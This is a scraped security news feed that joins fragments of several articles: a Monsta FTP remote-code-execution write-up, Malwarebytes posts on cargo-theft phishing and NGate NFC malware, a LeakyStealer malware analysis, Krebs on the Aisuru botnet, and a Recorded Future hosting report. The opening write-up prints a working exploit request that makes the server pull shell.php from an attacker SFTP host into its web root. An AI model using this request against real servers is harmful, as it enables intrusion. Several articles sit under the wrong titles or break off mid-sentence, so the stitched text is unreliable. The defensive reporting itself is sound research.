If you’re following along at home, you’d be forgiven for thinking this is a cute little theory that looks great on paper but falls apart in practice.

Here’s the idea (shocking, we know):

1. Trick Monsta FTP into connecting to our remote SFTP host.
2. Have Monsta FTP download a file we control.
3. Tell Monsta FTP to write that file to an arbitrary path on the Monsta server.

Cute.

Spoiler: it actually worked.

We spun up a malicious SFTP server, sent a `downloadFile` request to the Monsta FTP instance, and watched it behave exactly like we feared - it connected, pulled our payload, and wrote it to the specified path.

The following HTTP request illustrates how this would work:

```
POST /mftp/application/api/api.php HTTP/1.1 Host: {{Nostname}} Content-Type: application/x-www-form-urlencoded request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-IP}}","remoteUsername":"sftpuser","initialDirectory":"/","authenticationModeName":"Password","password":"password111","port":2222},"actionName":"downloadFile","context":{"remotePath":"/shell.php","localPath":"/var/www/html/mftp/index3.php"}}&csrf_token=6e080f63ea774944feedef49eb77c6fffdd8291b9c6561022696b9222942644e
```

Below, for completeness' sake, we verify that our new file has been successfully written to the specified file path:

```
GET /mftp/index3.php HTTP/1.1 Host: {{Hostname}}
```

```
HTTP/1.1 200 OK Date: Fri, 05 Sep 2025 09:43:50 GMT Server: Apache/2.4.54 (Debian) X-Powered-By: PHP/7.4.33 Vary: Accept-Encoding Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8 Content-Length: 75 watchTowr uid=33(www-data) gid=33(www-data) groups=33(www-data) watchTowr
```

So there we have it - a pre-authenticated Remote Code Execution vulnerability in the latest (at the time) release of Monsta FTP.

While we can’t definitively confirm whether the above vulnerability is identical to CVE-2022-27468, we can confidently state that this vulnerability has been patched as of version `2.11.3`, released on 26 August 2025.

As of November 4, 2025, a new CVE has been assigned with an updated description: CVE-2025-34299.

Sigh.

The most targeted commodities are food and beverage products.”Although the cyberattacks were mostly seen in North America, cargo theft is a problem across the world, impacting consumers and businesses that rely on the often-overlooked network of trucks, trains, ships, planes, and people.In these attacks, cybercriminals compromise the accounts of carrier companies that transport goods from one location to the next. By posing as legitimate carriers, they can place real bids on shipments and then redirect them to unauthorized destinations, where they or their partners will receive and steal the cargo.Researchers found that attackers take control of these accounts in at least one of three ways.Attackers may post a fake order on what’s called a “load board,” a digital marketplace that connects shippers with carriers so that cargo can be assigned and accepted. But when legitimate carriers inquire about the fake load board posting, the criminals reply with an email that includes a malicious link that, when clicked, installs Remote Monitoring and Management (RMM) software. (To make the scam more convincing, the cybercriminals also compromise a “broker” account so their load board posting looks legitimate.)Despite the sneaky install method, RMM software itself is entirely legitimate. It’s used by IT support teams to remotely fix issues for employees. But that legitimacy makes RMM software perfect for any cybercriminal campaign because it may raise fewer red flags from older antivirus tools.Once the attackers gain access to a carrier’s account, they can also deploy malware to steal account credentials, giving them greater access to a company’s network.2. Compromised email accountsA second observed attack method involved hijacking an active email address and then impersonating the owner when responding to emails about cargo orders and shipments. Here, too, cybercriminals inserted malicious links into emails that eventually install RMM tools.Finally, researchers also observed the attackers sending direct phishing emails to carriers, using classic social engineering tricks—like sending a bogus bill to lure victims into clicking malicious links. While many of the well-tested security best practices still apply—like not clicking on links inside emails—one of the strongest defenses is to use a security product that notifies users about RMM tools (also sometimes referred to as Remote Desktop Programs) installed on their device. RMM tools are legitimate, but because of their abuses in cybercriminal campaigns, it is important that every installation is verified and tracked.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Android malware steals your card details and PIN to make instant ATM withdrawals</title><link>https://www.malwarebytes.com/blog/news/2025/11/android-malware-steals-your-card-details-and-pin-to-make-instant-atm-withdrawals</link><author></author><category>threatintel</category><pubDate>Thu, 6 Nov 2025 16:48:11 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[The Polish Computer Emergency Response Team (CERT Polska) analyzed a new Android-based malware that uses NFC technology to perform unauthorized ATM cash withdrawals and drain victims’ bank accounts.Researchers found that the malware, called NGate, lets attackers withdraw cash from ATMs (Automated Teller Machines, or cash machines) using banking data exfiltrated from victims’ phones—without ever physically stealing the cards.NFC is a wireless technology that allows devices such as smartphones, payment cards, and terminals to communicate when they’re very close together. So, instead of stealing your bank card, the attackers capture NFC (Near Field Communication) activity on a mobile phone infected with the NGate malware and forward that transaction data to devices at ATMs. In NGate’s case the stolen data is sent over the network to the attackers’ servers rather than being relayed purely by radio.NFC comes in a few “flavors.” Some produce a static code—for example, the card that opens my apartment building door. That kind of signal can easily be copied to a device like my “Flipper Zero” so I can use that to open the door. But sophisticated contactless payment cards (like your Visa or Mastercard debit and credit cards) use dynamic codes. Each time you use the NFC, your card’s chip generates a unique, one-time code (often called a cryptogram or token) that cannot be reused and is different every time.So, that’s what makes the NGate malware more sophisticated. It doesn’t simply grab a signal from your card. The phone must be infected, and the victim must be tricked into performing a tap-to-pay or card-verification action and entering their PIN. When that happens, the app captures all the necessary NFC transaction data exchanged — not just the card number, but the fresh one-time codes and other details generated in that moment.The malware then instantly sends all that NFC data, including the PIN, to the attacker’s device. Because the codes are freshly generated and valid only for a short time, the attacker uses them immediately to imitate your card at an ATM; the accomplice at the ATM presents the captured data using a card-emulating device such as a phone, smartwatch, or custom hardware.But, as you can imagine, being ready at an ATM when the data comes in takes planning—and social engineering.First, attackers need to plant the malware on the victim’s device. Typically, they send phishing emails or SMS messages to potential victims. These often claim there is a security or technical issue with their bank account, trying to induce worry or urgency. Sometimes, they follow up with a phone call, pretending to be from the bank. These messages or calls direct victims to download a fake “banking” app from a non-official source, such as a direct link instead of Google Play.Once installed, the app app asks for permissions and leads victims through fake “card verification” steps. The goal is to get victims to act quickly and trustingly—while an accomplice waits at an ATM to cash out.NGate only works if your phone is infected and you’re tricked into initiating a tap-to-pay action on the fake banking app and entering your PIN. So the best way to stay safe from this malware is keep your phone protected and stay vigilant to social engineering:Stick to trusted sources. Download apps only from Google Play, Apple’s App Store, or the official provider. Your bank will never ask you to use another source. Use an up-to-date real-time anti-malware solution like Malwarebytes for Android, which already detects this malware.Do not engage with unsolicited callers. If someone claims to be from your bank, tell them you’ll call them back at the number you have on file.Malwarebytes for Android detects these banking Trojans as Android/Trojan.Spy.NGate.C; Android/Trojan.Agent.SIB01022b454eH140; Android/Trojan.Agent.SIB01c84b1237H62; Android/Trojan.Spy.Generic.AUR9552b53bH2756 and Android/Trojan.Banker.AURf26adb59C19.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Take control of your privacy with updates on Malwarebytes for Windows</title><link>https://www.malwarebytes.com/blog/privacy/2025/11/take-control-of-your-privacy-with-updates-on-malwarebytes-for-windows</link><author></author><category>threatintel</category><pubDate>Thu, 6 Nov 2025 16:40:02 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[It’s getting harder to keep your Windows space truly yours, as Microsoft increasingly serves annoying ads and tracks your data across third-party apps.Pushing back against your eroding privacy has been a scattered and sometimes complicated process… but we’re making it easier for you.

The duo performs reconnaissance on an infected machine and targets multiple crypto wallets, including browser extensions corresponding to crypto wallets. The malware also looks for browser history files from  and .The first stage (LeakyInjector) decrypts the -encrypted second stage  (LeakyStealer) and injects the payload into the explorer.exe process. The stealer computes the Bot ID corresponding to the infected machine and establishes persistence using an entry under the Run registry key. The malware implements a polymorphic engine that modifies memory bytes using specific hard-coded values. LeakyStealer searches for crypto wallets such as , and  in addition to browser extensions like , and . Two backdoor commands are implemented: downloading and executing a file, and executing Windows commands. A Hybrid Analysis PerspectiveThe sample is a 64-bit Windows executable (approximately 30 MB, padded with null bytes) and is signed with a valid digital certificate. The malware contains numerous debug strings and artifacts, indicating minimal obfuscation.The malware establishes persistence by creating an entry under the Run registry key:Figure 2 - Persistence through registry manipulationLooking at the “HTTP Traffic” in the Hybrid Analysis report, we can identify HTTP POST requests used for C2 communications. The domain was recently registered. The process connects to  on port 443 (TCP), using a browser-related user agent.Figure 3 - HTTP POST requests to the C2 serverThe stealer is looking for different browser extensions corresponding to crypto wallets:Figure 4 - Crypto wallets are targetedThe malware reads browser-related files to retrieve the browser history, as highlighted in the figure below.Figure 5 - Accessing browser-related dataThe first stage - which we named LeakyInjector - is looking for the “explorer.exe” process on the host:Figure 6 - The injector searches for the explorer.exe processThe malware injects the next stage into the explorer process using the low level APIs displayed below.Figure 7 - Perform process injection using low level APIsThe stealer that we called LeakyStealer is stored in an encrypted form in the injector and is decrypted using the  algorithm, with the key and nonce being hard-coded.Figure 8 - ChaCha20 algorithm is used to decrypt the stealer before it’s being injectedThe malware computes the Bot ID of the infected host by XOR-ing the “” volume serial number with the  constant. If not available, the Bot ID is initialized using the  function.Figure 9 - Bot ID value is computedIt retrieves the hostname, the username, and the domain assigned to the local machine (see Figure 10).Figure 10 - Extract information that will be exfiltratedThe malicious process determines whether it’s running with admin privileges using the  API (0x14 = ):Figure 11 - Determine if the malware is running with admin privilegesThe binary connects to the everstead[.]group C2 server using a hard-coded user agent, as highlighted below.Figure 12 - First connection to the C2 serverA field called “” is initialized with the “” value.

It establishes persistence by creating an entry called “” under the Run registry key:Figure 14 - Self-copy and persistenceLeakyStealer implements a “polymorphic engine” that is able to modify its memory area with hard-coded bytes at runtime:Figure 15 - Modify bytes using a routine called polymorphic engine at runtimeThe search is performed for the 8-byte marker “”. The process changes the memory protection of the first 16 bytes (including the marker) using  (0x40 = ). These 16 bytes are modified to a randomized sequence of “no-operation” assembly instructions, such as 0x90 for NOP, “” for , or “” for “”. The code that performs the patching is fairly common and frequently found in video game cheat engines. Its purpose in this sample remains unclear as it does not change any actual code and limits the patching to the marker bytes.Figure 16 - Replace the 16 bytes containing the hard-coded marker using different bytesThe binary enters a loop that builds a registration packet that will be sent to the C2 server (Figure 17).Figure 17 - LeakyStealer is beaconing to the C2 server at regular intervalsThe  and  methods are utilized to obtain the Windows version:Figure 18 - Retrieve the Windows OS versionThe registration packet contains the “” magic string, the Bot ID, 0x01 (value corresponding to a Registration packet), the admin flag, the traffic tag, the hostname, the username, the Windows domain, and the OS version:Figure 19 - Registration packet is constructedFigure 20 - Example of a registration packetLeakyStealer is looking for cryptocurrency wallets such as  and :Figure 21 - Multiple crypto wallets are targetedCryptocurrency browser extensions such as  and  are also targeted:Figure 22 - Crypto browser extensionsThe malware exfiltrates the registration packet to the “” URI. The server’s response is received and read using the  and  functions (Figure 23).Figure 23 - Server’s response is received and parsedThe binary extracts the history file from the following browsers: , and .Figure 24 - Obtain the history file from multiple browsersEvery history file found is copied to the temporary folder as “”, where “” is generated via a function call to . The malware reads these files in memory and deletes them afterward using the  API, as highlighted below.Figure 25 - Create copies of history files, read them, and then delete them afterwardsThe browser history is exfiltrated to the C2 server using the “” URI. We observe that the stealer adds the “” header in the request:Figure 26 - Browser history files are sent to the C2 serverFigure 27 - Example of exfiltrating the browsing history filesThe server’s response has the following structure: “”. The command type can be 0 (No command from the server), 1 (two commands implemented by the stealer), and >=2 (Unknown command type).Figure 28 - Specific packet structure is expected from the C2 serverThe first command is used to download and execute a file from the C2 server. It has the “d” structure.Figure 29 - Download command implemented by LeakyStealerAs we can see below, the process downloads the file from the C2 server, creates and populates the newly created file, and finally executes it using the  method.Figure 30 - Create new file mentioned in the commandFigure 31 - CreateProcessA API callThe second command can be used to run Windows commands on the infected machine and sends the output to the C2 server. The output is read using an anonymous pipe:Figure 32 - Execute Windows command on the infected hostMapping the infrastructureThe certificate’s issuer details point to a Hong Kong registrant. Similar versions of the stealer were signed with the same certificate. At the time of the analysis, the certificate was still valid, but at the time of publishing this report it has been revoked by its issuer.Figure 33 - Signed Certificate informationThe certificate thumbprint  revealed seven related samples, demonstrating that the threat actor reuses signing infrastructure across multiple payloads.This legitimate Extended Validation (EV) certificate may have been potentially obtained through fraudulent means or a compromised business entity may have potentially been abused for malware signing. The seven samples share consistent operational patterns:Persistence mechanisms across all variantsMasquerading as legitimate Microsoft Edge update componentsRecent activity with samples spanning October 1-9, 2025 A Shodan search for the IP address returns open ports 22, 80 and 443.Figure 34 - Shodan searchThere are two domains associated with the IP address, namely “” and “”.  Figure 35 - Shodan result for the IP addressThe MSI file called “” drops LeakyStealer with SHA256  that communicates with the same C2 server. The installer could be downloaded from the  domain, as highlighted below:Figure 36 - VirusTotal result shows the distribution site of the installerWe’ve identified a PowerShell script that is related to NetSupportRAT on the same domain:Figure 37 - PowerShell script related to NetSupportRAT was stored on the distribution domainLeakyStealer Through the Eyes of Hybrid AnalysisThe Hybrid Analysis report identifies multiple behavioral patterns and indicators that classify LeakyStealer as a new, information-stealing malware. For example, it highlights that the process targets crypto browser extensions and the history files across multiple browsers. Through in-depth technical analysis of LeakyStealer’s core functionality, we’re potentially offering insights enabling more effective detection and defense strategies.Hybrid Analysis is a powerful platform for identifying and analyzing malware, whether mundane or highly sophisticated.

As set forth in the indictment, the rigged games used altered shuffling machines that contained hidden technology allowing the machines to read all the cards in the deck.  Because the cards were always dealt in a particular order to the players at the table, the machines could determine which player would have the winning hand. This information was transmitted to an off-site member of the conspiracy, who then transmitted that information via cellphone back to a member of the conspiracy who was playing at the table, referred to as the “Quarterback” or “Driver.”  The Quarterback then secretly signaled this information (usually by prearranged signals like touching certain chips or other items on the table) to other co-conspirators playing at the table, who were also participants in the scheme.  Collectively, the Quarterback and other players in on the scheme (i.e., the cheating team) used this information to win poker games against unwitting victims, who sometimes lost tens or hundreds of thousands of dollars at a time. The defendants used other cheating technology as well, such as a chip tray analyzer (essentially, a poker chip tray that also secretly read all cards using hidden cameras), an x-ray table that could read cards face down on the table, and special contact lenses or eyeglasses that could read pre-marked cards. ]]></content:encoded></item><item><title>From Tabletop to Turnkey: Building Cyber Resilience in Financial Services</title><link>https://thehackernews.com/2025/11/from-tabletop-to-turnkey-building-cyber.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgiaJEM1FidoLhzNIrYBATCN7L9TeVdHj9VIprFLqsgTxUHm_iQChfyBlaCMZmoGonBSd1lHzUuVLOOY-tp25Ys8SdCPz_D86hBTHEOv_7LQijqkKpwRUr7AzQSlhL8KjqlKKZ1eYH-UBv6sAVfyFtyjisLixySCxpFvnHGJ6XaqWtc1EnB4_NkbnBxqTT5/s1600/lock.jpg" length="" type=""/><pubDate>Thu, 6 Nov 2025 11:59:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Introduction

Using freedom of information laws, the site discovered five incidents that had taken place since January 1, 2024.A steady stream of water attacksThese aren’t the first attacks on UK water systems. In August 2022, the Clop ransomware gang hit South Staffordshire Water, thinking that it was actually Thames Water. The attack focused on stealing customer data, meaning water supplies weren’t disrupted, although corporate systems were affected.In late 2023, pro-Iranian hackers disrupted water supplies in County Mayo, Ireland. The intruders, known as the Cyber Av2ngers group, caused outages across 160 homes for two days. The attack was politically motivated by the utility’s apparent use of an Israeli-made tool.These are far from the only attacks on water systems around the world. In February last year, CISA warned that a Chinese state-sponsored group had spent nine months moving laterally through a US water facility.In that incident, attackers gained access using an administrator’s login and spent months inside the infrastructure, nosing around databases and other assets. CISA linked the intrusion to Volt Typhoon—a group that also targeted telecommunications companies around the world. The attackers were described as “OT adjacent,” meaning they had reached administrative systems close enough to potentially impact the operational technology that controls water flow.The attacks keep coming. Just last month, the Canadian Centre for Cybersecurity reported an attack on a municipal water facility. Hacktivists managed to alter water pressure, causing “degraded service” for the local community.It’s always worrying when attackers target critical national infrastructure. When attackers hit Colonial Pipeline in 2021, they only compromised its administrative network (the part that handles paperwork). But the company was spooked enough that it shut down its fuel distribution systems too, as a protective measure, causing gasoline prices to spike across the US East Coast.A possible legal shake-upMany attacks on water systems might go unreported, depending on where they happen. The UK’s Network and Information Systems (NIS) regulations dictate that critical national infrastructure organizations should reveal cyber attacks to the public. However, that only applies if those attacks caused disruption.That’s why the attacks uncovered by Recorded Future haven’t been made public until now. While worrying, they didn’t affect the UK’s water supply. A 2022 review of the NIS regulations criticized this limited disclosure, noting that attacks with the potential to disrupt services often went unreported.Although the attacks reported to Recorded Future were voluntarily disclosed by the DWI by suppliers, upcoming legal changes could lower the bar for mandatory reporting. The UK’s proposed Cyber Security and Resilience Bill would expand disclosure requirements, increasing transparency about attacks that could affect the water supply. The Bill is expected to reach Parliament in 2025—though time is running short.A resource under pressureWater is under considerable threat already in the UK, with major droughts declared this year. The Met Office reports that this year’s February-to-April period was the driest since 1956, with rainfall at just half the long-term average. River flows have dropped sharply, soil moisture is down, and the National Drought Group has met to coordinate a national response.Water companies already have plans to manage shortages, the UK government says. But as the cyberattacks mount, the question is: are their system defenses strong enough too?We don’t just report on threats—we remove them]]></content:encoded></item><item><title>ESET APT Activity Report Q2 2025–Q3 2025</title><link>https://www.welivesecurity.com/en/eset-research/eset-apt-activity-report-q2-2025-q3-2025/</link><author></author><category>threatintel</category><pubDate>Thu, 6 Nov 2025 09:45:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[An overview of the activities of selected APT groups investigated and analyzed by ESET Research in Q2 2025 and Q3 2025]]></content:encoded></item><item><title>Hackers Weaponize Windows Hyper-V to Hide Linux VM and Evade EDR Detection</title><link>https://thehackernews.com/2025/11/hackers-weaponize-windows-hyper-v-to.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGBz7Fh35GCGnvq_75iKz59PN9dxPcO-sdZAGTMvQPVJ9tzq2wM8w5LzPxk1ZR8TITolw6e66VvmGhhE4Mu66MyW71fGIK1jVGkZU0TTOP01chaZWdcGzVYPwPMDz5spgt8ZajT7HOTW8cRBpFmudNWD6XIlQiZto9DdeuUPYUvGh4kOISUNI0TDt7DLq7/s1600/iwndows.jpg" length="" type=""/><pubDate>Thu, 6 Nov 2025 07:22:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The threat actor known as Curly COMrades has been observed exploiting virtualization technologies as a way to bypass security solutions and execute custom malware.

Cloudflare responded by redacting Aisuru domain names from their top websites list. The chief executive at Cloudflare says Aisuru’s overlords are using the botnet to boost their malicious domain rankings, while simultaneously attacking the company’s domain name system (DNS) service.The #1 and #3 positions in this chart are Aisuru botnet controllers with their full domain names redacted. Source: radar.cloudflare.com.Until recently, Aisuru’s malicious code instructed all infected systems to use DNS servers from Google — specifically, the servers at 8.8.8.8. But in early October, Aisuru switched to invoking Cloudflare’s main DNS server — 1.1.1.1 — and over the past week domains used by Aisuru to control infected systems started populating Cloudflare’s top domain rankings.As screenshots of Aisuru domains claiming two of the Top 10 positions ping-ponged across social media, many feared this was yet another sign that an already untamable botnet was running completely amok. One Aisuru botnet domain that sat prominently for days at #1 on the list was someone’s street address in Massachusetts followed by “.com”. Other Aisuru domains mimicked those belonging to major cloud providers.Cloudflare tried to address these security, brand confusion and privacy concerns by partially redacting the malicious domains, and adding a warning at the top of its rankings:“Note that the top 100 domains and trending domains lists include domains with organic activity as well as domains with emerging malicious behavior.”Cloudflare CEO  told KrebsOnSecurity the company’s domain ranking system is fairly simplistic, and that it merely measures the volume of DNS queries to 1.1.1.1.“The attacker is just generating a ton of requests, maybe to influence the ranking but also to attack our DNS service,” Prince said, adding that Cloudflare has heard reports of other large public DNS services seeing similar uptick in attacks. “We’re fixing the ranking to make it smarter. And, in the meantime, redacting any sites we classify as malware.”, vice president of threat intel at the DNS security firm , said many people erroneously assumed that the skewed Cloudflare domain rankings meant there were more bot-infected devices than there were regular devices querying sites like Google and Apple and Microsoft.“Cloudflare’s documentation is clear — they know that when it comes to ranking domains you have to make choices on how to normalize things,” Burton wrote on . “There are many aspects that are simply out of your control. Why is it hard? Because reasons. TTL values, caching, prefetching, architecture, load balancing. Things that have shared control between the domain owner and everything in between.” is CEO of the anti-phishing and security firm . Greenland said he understands the technical reason why Aisuru botnet domains are showing up in Cloudflare’s rankings (those rankings are based on DNS query volume, not actual web visits). But he said they’re still not meant to be there.“It’s a failure on Cloudflare’s part, and reveals a compromise of the trust and integrity of their rankings,” he said.Greenland said Cloudflare planned for its Domain Rankings to list the most popular domains as used by human users, and it was never meant to be a raw calculation of query frequency or traffic volume going through their 1.1.1.1 DNS resolver.“They spelled out how their popularity algorithm is designed to reflect real human use and exclude automated traffic (they said they’re good at this),” Greenland wrote on LinkedIn. “So something has evidently gone wrong internally. We should have two rankings: one representing trust and real human use, and another derived from raw DNS volume.”Why might it be a good idea to wholly separate malicious domains from the list? Greenland notes that Cloudflare Domain Rankings see widespread use for trust and safety determination, by browsers, DNS resolvers, safe browsing APIs and things like TRANCO.“TRANCO is a respected open source list of the top million domains, and Cloudflare Radar is one of their five data providers,” he continued. “So there can be serious knock-on effects when a malicious domain features in Cloudflare’s top 10/100/1000/million. To many people and systems, the top 10 and 100 are naively considered safe and trusted, even though algorithmically-defined top-N lists will always be somewhat crude.”Over this past week, Cloudflare started redacting portions of the malicious Aisuru domains from its Top Domains list, leaving only their domain suffix visible. Sometime in the past 24 hours, Cloudflare appears to have begun hiding the malicious Aisuru domains entirely from the web version of that list. However, downloading a spreadsheet of the current Top 200 domains from Cloudflare Radar shows an Aisuru domain still at the very top.According to Cloudflare’s website, the majority of DNS queries to the top Aisuru domains — nearly 52 percent — originated from the United States. This tracks with my reporting from early October, which found Aisuru was drawing most of its firepower from IoT devices hosted on U.S. Internet providers like ,  and .Experts tracking Aisuru say the botnet relies on well more than a hundred control servers, and that for the moment at least most of those domains are registered in the .su top-level domain (TLD). Dot-su is the TLD assigned to the former Soviet Union (.su’s Wikipedia page says the TLD was created just 15 months before the fall of the Berlin wall).A Cloudflare blog post from October 27 found that .su had the highest “DNS magnitude” of any TLD, referring to a metric estimating the popularity of a TLD based on the number of unique networks querying Cloudflare’s 1.1.1.1 resolver. The report concluded that the top .su hostnames were associated with a popular online world-building game, and that more than half of the queries for that TLD came from the United States, Brazil and Germany [it’s worth noting that servers for the world-building game  were some of Aisuru’s most frequent targets].A simple and crude way to detect Aisuru bot activity on a network may be to set an alert on any systems attempting to contact domains ending in .su. This TLD is frequently abused for cybercrime and by cybercrime forums and services, and blocking access to it entirely is unlikely to raise any legitimate complaints.]]></content:encoded></item><item><title>ISC Stormcast For Thursday, November 6th, 2025 https://isc.sans.edu/podcastdetail/9688, (Thu, Nov 6th)</title><link>https://isc.sans.edu/diary/rss/32456</link><author></author><category>threatintel</category><pubDate>Thu, 6 Nov 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>October 2025 CVE Landscape</title><link>https://www.recordedfuture.com/blog/october-2025-cve-landscape</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_1afc13c5574e9a8966347fe80012616de5d023fd2.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Thu, 6 Nov 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[In October 2025, Recorded Future’s Insikt Group® identified thirty-two high-impact vulnerabilities that should be prioritized for remediation.

It provides upstream transit and data center services to a large concentration of high-risk hosting networks, which have consistently ranked among the top sources of validated malicious infrastructure seen within Recorded Future’s Network Intelligence. This nexus includes several hosting providers Insikt Group assesses with a high degree of confidence as threat activity enablers (TAEs), such as Virtualine Technologies, Femo IT Solutions Ltd, Global-Data System IT Corporation (SWISSNETWORK02), Railnet, and the recently sanctioned Aeza Group.Formed in 2023 following the transition of Combahton GmbH’s fastpipe[.]io network, aurologic operates from its primary facility at Tornado Datacenter GmbH & Co. KG in Langen, Germany. The company markets itself as a high-capacity European carrier, providing dedicated and cloud server hosting as well as data center colocation, IP transit services, and distributed denial-of-service (DDoS) protection to commercial and enterprise customers. Despite its core focus on legitimate network and data center operations, aurologic has emerged as a hub for some of the most abusive and high-risk networks operating within the global hosting ecosystem.Although it is not possible to confirm why so many of aurologic’s known downstream customers form such a large concentration of high-risk hosting networks, the fact that the company serves as a common link between multiple suspected TAEs is significant. There are likely multiple contributing factors, including aurologic’s self-proclaimed neutrality, its continued provision of upstream connectivity to sanctioned entities such as Aeza, and the perception of limited enforcement risk within the European regulatory environment. Collectively, these factors may have made aurologic an attractive option for high-risk providers seeking operational stability and resilience.Insikt Group assesses that aurologic's case exemplifies the broader structural challenges surrounding accountability within the hosting ecosystem. Upstream providers occupy a pivotal position within the internet’s infrastructure hierarchy and are uniquely positioned to disrupt persistent abuse. Yet many continue to defer responsibility for downstream activity, intervening only when legally compelled. While neutrality remains a foundational principle of internet governance, in practice, it has become a rationale for inaction, enabling networks repeatedly associated with cybercrime, disinformation, and other forms of abuse to persist. Meaningful progress against such activity can be made by upstream providers acting not solely out of legal obligation, but from an operational and ethical responsibility to prevent the misuse of the infrastructure.aurologic has become a central nexus within the global high-risk hosting ecosystem, repeatedly appearing as a common upstream provider.aurologic’s continued service to sanctioned and abuse-heavy networks demonstrates a practice of legal compliance over risk avoidance.aurologic’s reactive-based abuse handling exemplifies the systematic gap between legal neutrality and operational responsibility within the global hosting ecosystem.aurologic GmbH emerged in October 2023 as a German hosting provider built on the infrastructure and autonomous system number (ASN) AS30823, which was previously operated by combahton GmbH under the fastpipe[.]io brand. In November 2023, combahton GmbH formally announced its full transition into aurologic GmbH, cementing the rebrand and continuity of operations. aurologic markets a multi-terabit backbone across Europe, with its primary facility located at Tornado Datacenter GmbH & Co. KG. Both companies are headed by Joseph Maximilian Hofmann, who has served as CEO of aurologic since September 2015 and of Tornado Datacenter since April 2022.Since its inception in 2023, aurologic has been repeatedly cited in intelligence reporting and forums for its role in the broader hosting ecosystem supporting questionable or illicit activity. For example, Qurium’s report on the Doppelgänger disinformation network identified aurologic as one of the German upstream providers enabling Russia-linked infrastructure, maintaining long-standing relationships with hosting providers such as WAIcore Hosting Ltd (AS210281), Daniil Yevchenko (under the brand Altawk; AS203727), and EVILEMPIRE, aka Tnsecurity Ltd (AS216309). Community discussions have further scrutinized aurologic’s ongoing connectivity with Aeza International Ltd, an entity under US sanctions and, more recently, UK sanctions, despite Hofmann’s defense on public forums that Aeza Group LLC was not its “contractual customer.” Hoffman further defended the relationship by emphasizing low abuse volumes, proactive investigations, and compliance with German law. Nevertheless, routing evidence as of writing confirmed that aurologic remained a primary upstream to Aeza International Ltd (AS210644), reinforcing concerns around its continued upstream role.Beyond Aeza, aurologic has also appeared as a transit provider for some of the largest concentrations of suspected threat activity enablers tracked by Insikt Group, including metaspinner net GmbH, Femo IT Solutions Limited, Railnet LLC, Global-Data System IT Corporation, and more. These relationships position the company at the center of ongoing industry debates about infrastructure abuse and due diligence.Infrastructure and Routingaurologic maintains an extensive European interconnection footprint spanning key data centers across Germany, Finland, and the Netherlands. Its infrastructure is anchored in major European internet hubs in both Langen and Amsterdam, where the company maintains direct connections with large colocation facilities. These datacenters serve as central exchange points where networks, content delivery providers, and hosting companies interconnect to exchange traffic efficiently. By maintaining a presence in multiple facilities, aurologic ensures fast, redundant, and high-volume data transit across Europe.This level of connectivity makes aurologic an attractive upstream provider for a range of hosting companies, including those operating in ambiguous or opaque areas of the hosting ecosystem. Whether through technical neutrality, permissive policy, or limited oversight, aurologic’s infrastructure effectively provides a degree of protection and continuity to providers with a reputation for hosting malicious activity. As a result, aurologic sits in a complex position in the hosting landscape, where connectivity and enablement obscure the difference between infrastructure provider and facilitator. This dynamic sets the stage for understanding how aurologic’s network can serve as a foundation for persistent malicious infrastructure and why it plays such a critical role in enabling a broader ecosystem of threat activity.While aurologic’s broad connectivity footprint underpins its strength as a transit provider, it also introduces an enabling function within the threat infrastructure ecosystem. Its combination of network reach, capacity, and perceived permissiveness appears to appeal to questionable hosting providers seeking stable transit relationships that face fewer disruptions from abuse reporting or network-level mitigation efforts. Insikt Group identified more than a dozen TAEs using aurologic for upstream connectivity, ranging from sanctioned entities to self-proclaimed bulletproof hosting providers. The TAEs discussed in this section represent the most significant examples, having displayed some of the highest levels of validated malicious infrastructure within Recorded Future’s Network Intelligence relative to their announced IP space. A full list of active networks analyzed by Recorded Future and linked to aurologic can be found in .Aeza Group is a Russian hosting provider established in 2021 that primarily operates through its UK-registered company, Aeza International Ltd (AS210644). Since its inception, Aeza has become a well-known TAE, enabling cybercriminal and state-aligned operations through resilient, abuse-tolerant infrastructure. At the time of writing, approximately 50% of Aeza International’s announced IP prefixes are routed via aurologic, highlighting its continued dependence on the German provider for upstream connectivity.Insikt Group highlighted Aeza as one of the most prominent sources of validated malicious infrastructure in the Recorded Future 2024 Malicious Infrastructure Report, detailing its role in enabling a range of threats, including ransomware and infostealers, and citing its significant role in the Russian disinformation network Doppelgänger. After the release of Qurium’s Doppelgänger report in July 2024, Aeza revealed in August 2024 that DataCamp Limited (AS60068), a UK-based hosting provider, had terminated its contract, and that, as a result, Aeza partnered with aurologic to continue operations (). Aeza’s continued operations have since prompted law enforcement and regulatory responses from Russia, the United States, and the United Kingdom.A post from “mw” on the forum LowEndTalk quoting Aeza (Source:In April 2025, Russian authorities arrested Aeza Group co-founders Yurii Meruzhanovich Bozoyan and Arsenii Aleksandrovich Penzev on charges related to their alleged involvement in operating the darknet drug marketplace BlackSprut. The arrests followed an April 1 raid by the Federal Security Service (FSB) on Aeza’s Saint Petersburg headquarters, located in the former Wagner PMC Center.Both Bozoyan and Penzev were charged under Articles 210 and 228.1 of the Russian Criminal Code for participation in an organized criminal group and large-scale drug trafficking. Russian media reports described the two as having provided the “technical base” for BlackSprut’s operations, which Aeza hosted through its UK-registered entity, Aeza International Ltd.On July 1, 2025, the US Department of the Treasury’s Office of Foreign Assets Control (OFAC), incoordination with the UK’s National Crime Agency (NCA), sanctioned Aeza Group and its affiliated companies, labeling them a “bulletproof hosting services provider.” OFAC attributed Aeza Group infrastructure to operations involving BianLian 